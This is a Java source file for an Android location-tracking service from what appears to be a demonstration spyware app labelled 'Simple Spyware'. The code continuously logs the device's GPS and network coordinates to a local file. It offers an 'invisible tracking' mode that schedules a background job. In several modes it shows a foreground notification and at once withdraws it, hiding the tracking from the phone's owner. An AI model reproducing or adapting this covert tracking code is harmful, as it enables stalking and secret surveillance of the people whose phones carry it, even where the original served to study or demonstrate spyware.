package ch.zhaw.init.orwell_a.data.location;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Calendar;
import ch.zhaw.init.orwell_a.R;
import ch.zhaw.init.orwell_a.common.FileWriterInstance;

public class LocationTrackerService extends Service implements LocationListener {
    private static final String TAG = LocationTrackerService.class.getCanonicalName();
    private LocationManager locationManager;
    private static final long MIN_REFRESH_TIME_MILLISECONDS = 10000;
    private static final long MIN_REFRESH_DISTANCE_METERS = 20;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        if(intent != null){
            if(intent.getAction() != null && intent.getAction().equals("StartInvisibleTracking")){
                setTrackingJob();
            }
            else if (intent.getAction() != null && intent.getAction().equals("GetSinglePositionUpdate")) {
                startForegroundService();
                Log.i(TAG, "STARTED LOCATION TRACKING: GetSinglePositionUpdate");
                startSinglePositionTracking();
                stopForeground(true);
            }
            else if (intent.getAction() != null && intent.getAction().equals("StopServiceLocationTracking")) {
                Log.i(TAG, "Stop Location Service: " + Calendar.getInstance().getTime());
                stopSelf();
            } else if (intent.getAction() != null && intent.getAction().equals("StartServiceLocationTracking")) {
                Log.i(TAG, "STARTED LOCATION TRACKING: StartServiceLocationTracking");
                startForegroundService();
                startTracking();
                stopForeground(true);
            }
            else if (intent.getAction() != null && intent.getAction().equals("StartServiceLocationTrackingVisible")) {
                Log.i(TAG, "STARTED LOCATION TRACKING: StartServiceLocationTrackingVisible");
                startForegroundService();
                startTracking();
            }
            else if(intent.getAction() != null && intent.getAction().equals("StartServiceLocation")){
                startTracking();
            }
        }
        return START_NOT_STICKY;
    }

    private void setTrackingJob(){
        ComponentName serviceComponent = new ComponentName(this, LocationTrackerJob.class);
        JobInfo.Builder builder = new JobInfo.Builder(232, serviceComponent);
        builder.setRequiresBatteryNotLow(true);
        JobScheduler jobScheduler = this.getSystemService(JobScheduler.class);
        if(jobScheduler != null){
            jobScheduler.schedule(builder.build());
        }
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "LocationTrackerService started: " + Calendar.getInstance().getTime());
        locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
    }

    /**
     * Starts tracking for one single position update.
     */
    private void startSinglePositionTracking() {
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, this, null );
            locationManager.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, this, null );
        }catch (Exception ex){
            Log.e(TAG, ex.getMessage());
        }
    }

    /**
     * Create a Notification to start a foreground-service.
     */
    private void startForegroundService() {
        NotificationChannel channel = new NotificationChannel("1", "Location", NotificationManager.IMPORTANCE_LOW);
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if(notificationManager != null){
            notificationManager.createNotificationChannel(channel);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
                    .setSmallIcon(R.drawable.ic_remove_red_eye_black_24dp)
                    .setContentTitle("Simple Spyware")
                    .setContentText("Tracking your position!")
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setAutoCancel(true);
            Notification notification = builder.build();
            this.startForeground(1, notification);
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        String data = location.getTime()+";"+location.getLatitude()+";"+location.getLongitude()+";"+location.getAltitude()+"\n";
        FileWriterInstance.toInternalStorage(data.getBytes(), "locations.log", getApplicationContext(), true);
        Log.i(TAG, "New Location Update: Latitude: " + location.getLatitude() + " Altitude:"
                + location.getAltitude() + " Longitude: " + location.getLongitude());
    }

    /**
     * Starts a permanent tracking of the location.
     */
    public void startTracking() {
        try {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                    MIN_REFRESH_TIME_MILLISECONDS,
                    MIN_REFRESH_DISTANCE_METERS,
                    this );
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
                    MIN_REFRESH_TIME_MILLISECONDS,
                    MIN_REFRESH_DISTANCE_METERS,
                    this );
        } catch (java.lang.SecurityException ex) {
            Log.e(TAG, "fail to request location update, ignore", ex);
            stopSelf();
        } catch (IllegalArgumentException ex) {
            Log.e(TAG, "gps provider does not exist " + ex.getMessage());
            stopSelf();
        }
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }
}
